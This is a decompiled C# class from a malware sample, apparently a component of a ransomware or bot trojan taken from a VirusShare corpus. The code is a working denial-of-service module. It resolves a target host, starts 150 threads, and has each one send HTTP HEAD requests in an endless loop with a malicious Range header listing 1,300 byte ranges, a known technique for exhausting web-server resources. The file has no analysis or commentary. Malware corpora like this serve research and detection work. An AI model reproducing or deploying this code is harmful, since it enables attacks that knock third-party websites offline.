// Decompiled with JetBrains decompiler
// Type: insomnia.Class20
// Assembly: insomnia, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 848092D5-5192-4B4F-B8F0-07AD40D025FA
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00100-msil\Trojan-Ransom.Win32.Blocker.exyo-803dbe7f976d166aef05102db1219065c8b0bb78e3cf85095fc361f891e6a4e0.exe

using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;

namespace insomnia
{
  internal class Class20
  {
    public static string Field8 = Class20.Method4();
    public static string Field7;
    public static int Field6 = 80;
    public static int Field5 = 150;
    private static IPEndPoint Field4;
    private static ThreadStart[] Field3;
    private static Thread[] Field2;
    public static bool Field1 = false;

    private static string Method4()
    {
      string str = "";
      for (int index = 0; index < 1300; ++index)
        str = str + ",5-" + (object) index;
      return str;
    }

    public static void Method3()
    {
      try
      {
        Class20.Field4 = new IPEndPoint(Dns.GetHostEntry(Class20.Field7).AddressList[0], Class20.Field6);
      }
      catch
      {
        Class20.Field4 = new IPEndPoint(IPAddress.Parse(Class20.Field7), Class20.Field6);
      }
      Class20.Field2 = new Thread[Class20.Field5];
      Class20.Field3 = new ThreadStart[Class20.Field5];
      for (int index = 0; index < Class20.Field5; ++index)
      {
        Class20.Field3[index] = new ThreadStart(Class20.Method1);
        Class20.Field2[index] = new Thread(Class20.Field3[index]);
        Class20.Field2[index].Start();
      }
    }

    public static void Method2()
    {
      for (int index = 0; index < Class20.Field5; ++index)
      {
        try
        {
          Class20.Field2[index].Suspend();
        }
        catch
        {
        }
      }
    }

    private static void Method1()
    {
      try
      {
        byte[] bytes = Encoding.UTF8.GetBytes(string.Format("HEAD / HTTP/1.1\r\nHost: {0}\r\nRange:bytes=0-{1}\r\nAccept-Encoding: gzip\r\nConnection: close\r\n\r\n", (object) Class20.Field7, (object) Class20.Field8));
        Socket socket = Class36.Method1(Class20.Field4.Address.ToString(), Class20.Field6);
        while (true)
        {
          socket.Send(bytes, bytes.Length, SocketFlags.None);
          Thread.Sleep(Class39.Method12(2000, 10000));
        }
      }
      catch
      {
        Class20.Method1();
      }
    }
  }
}
